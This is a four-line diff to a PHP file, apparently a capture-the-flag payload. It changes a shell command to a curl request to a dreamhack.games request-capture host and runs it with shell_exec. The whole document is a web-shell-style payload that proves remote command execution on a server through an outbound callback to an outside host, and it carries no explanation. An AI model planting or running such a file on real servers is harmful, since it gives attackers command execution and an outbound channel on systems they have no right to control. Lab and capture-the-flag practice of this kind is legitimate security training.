@@ -1,4 +1,4 @@
 <?php
-cmd='ls'
+$cmd='curl https://mefwkue.request.dreamhack.games'
 echo shell_exec($cmd);
 ?>
